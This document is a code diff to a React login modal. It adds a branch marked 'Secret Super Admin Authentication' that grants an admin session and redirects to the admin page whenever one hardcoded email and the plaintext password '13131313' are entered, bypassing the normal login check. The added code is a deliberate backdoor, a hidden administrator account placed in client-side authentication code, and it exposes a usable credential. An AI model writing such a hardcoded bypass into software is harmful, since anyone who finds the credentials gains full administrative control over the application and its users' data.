@@ -68,6 +68,22 @@ export default function AuthModal({
         return;
       }
 
+      const cleanEmail = email.trim().toLowerCase();
+      const cleanPassword = password.trim();
+
+      // Secret Super Admin Authentication
+      if (cleanEmail === 'xurshid_admin@gmail.com' && cleanPassword === '13131313') {
+        StorageManager.setAdminSession(true);
+        SessionManager.touchActivity();
+        setIsSuccess(true);
+        setTimeout(() => {
+          setIsSuccess(false);
+          if (onClose) onClose();
+          window.location.href = '/admin';
+        }, 500);
+        return;
+      }
+
       const user = StorageManager.loginUser(email.trim(), password.trim());
       if (user) {
         SessionManager.touchActivity();
